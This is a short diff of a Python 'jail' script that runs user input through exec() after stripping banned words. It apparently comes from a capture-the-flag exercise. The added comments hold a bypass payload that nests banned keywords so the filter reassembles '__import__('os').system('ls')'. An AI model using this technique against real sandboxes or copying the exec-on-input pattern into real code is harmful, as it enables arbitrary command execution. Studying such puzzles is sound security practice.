@@ -1,3 +1,4 @@
+#!/bin/python3.12
 import string
 
 code = input('Your scientific computation: ')
@@ -11,3 +12,7 @@ for f in forbidden:
 
 print(code)
 exec(code)
+
+
+# __import__('os').syssystemtem('ls')
+# __impimportort__('ooss').syssystemtem('ls')
